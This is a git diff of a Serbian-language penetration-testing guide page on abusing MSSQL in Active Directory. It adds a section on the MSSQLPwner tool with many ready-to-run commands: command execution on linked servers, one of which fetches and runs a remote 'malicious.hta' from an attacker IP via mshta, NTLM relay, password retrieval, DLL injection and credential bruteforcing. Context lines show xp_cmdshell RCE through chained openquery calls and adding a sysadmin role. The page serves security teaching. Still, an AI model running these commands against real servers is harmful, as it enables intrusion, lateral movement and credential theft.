@@ -21,7 +21,73 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## **MSSQL Enumeration / Discovery**
 
-PowerShell modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma koristan u ovom slučaju.
+### Python
+Alat [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se zasniva na impacket-u, i takođe omogućava autentifikaciju korišćenjem kerberos karata, i napad kroz lanac veza.
+
+<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
+```shell
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+
+# Interactive mode with 2 depth level of impersonations
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive
+
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+
+# Executing direct query
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
+
+# Retrieving password from the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
+
+# Execute code using custom assembly on the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
+
+# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+
+```
+### Enumeracija sa mreže bez domen sesije
+```
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+```
+---
+###  Powershell
+
+Powershell modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma koristan u ovom slučaju.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
@@ -89,9 +155,9 @@ Check in the page mentioned in the **following section how to do this manually.*
 
 ## MSSQL Pouzdane Povezane Baze
 
-Ako je MSSQL instanca pouzdana (povezana baza podataka) od strane druge MSSQL instance. Ako korisnik ima privilegije nad pouzdanom bazom podataka, moći će da **iskoristi odnos poverenja da izvrši upite i u drugoj instanci**. Ove veze poverenja mogu se povezivati i u nekom trenutku korisnik može pronaći neku pogrešno konfigurisanu bazu podataka gde može izvršavati komande.
+Ako je MSSQL instanca pouzdana (povezivanje baze podataka) od strane druge MSSQL instance. Ako korisnik ima privilegije nad pouzdanom bazom podataka, moći će da **iskoristi odnos poverenja da izvrši upite i u drugoj instanci**. Ove veze poverenja mogu se povezivati i u nekom trenutku korisnik može pronaći neku pogrešno konfigurisanu bazu podataka gde može izvršavati komande.
 
-**Povezane baze funkcionišu čak i preko šuma poverenja.**
+**Povezivanja između baza funkcionišu čak i preko šuma poverenja.**
 
 ### Zloupotreba Powershell-a
 ```powershell
@@ -137,9 +203,9 @@ Napomena da će metasploit pokušati da zloupotrebi samo `openquery()` funkciju 
 
 ### Ručno - Openquery()
 
-Sa **Linux**-a možete dobiti MSSQL konzolnu ljusku sa **sqsh** i **mssqlclient.py.**
+Sa **Linux-a** možete dobiti MSSQL konzolu sa **sqsh** i **mssqlclient.py.**
 
-Sa **Windows**-a takođe možete pronaći linkove i izvršiti komande ručno koristeći **MSSQL klijent kao** [**HeidiSQL**](https://www.heidisql.com)
+Sa **Windows-a** takođe možete pronaći linkove i izvršiti komande ručno koristeći **MSSQL klijent kao** [**HeidiSQL**](https://www.heidisql.com)
 
 _Prijavite se koristeći Windows autentifikaciju:_
 
@@ -172,9 +238,9 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Ako ne možete izvršiti akcije poput `exec xp_cmdshell` iz `openquery()`, pokušajte sa metodom `EXECUTE`.
+Ako ne možete da izvršite akcije poput `exec xp_cmdshell` iz `openquery()`, pokušajte sa metodom `EXECUTE`.
 
-### Ručno - EXECUTE
+### Manual - EXECUTE
 
 Takođe možete zloupotrebiti poverljive veze koristeći `EXECUTE`:
 ```bash
@@ -186,7 +252,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQL lokalni korisnik** obično ima posebnu vrstu privilegije nazvanu **`SeImpersonatePrivilege`**. Ovo omogućava nalogu da "imituje klijenta nakon autentifikacije".
 
-Strategija koju su mnogi autori smislili je da primoraju SYSTEM servis da se autentifikuje na zlonameran ili man-in-the-middle servis koji napadač kreira. Ovaj zlonamerni servis tada može da imitira SYSTEM servis dok pokušava da se autentifikuje.
+Strategija koju su mnogi autori smislili je da primoraju SYSTEM servis da se autentifikuje na zlonamerni ili man-in-the-middle servis koji napadač kreira. Ovaj zlonamerni servis tada može da imitira SYSTEM servis dok pokušava da se autentifikuje.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ima kolekciju ovih različitih tehnika koje se mogu izvršiti putem Beacon-ove komande `execute-assembly`.
 
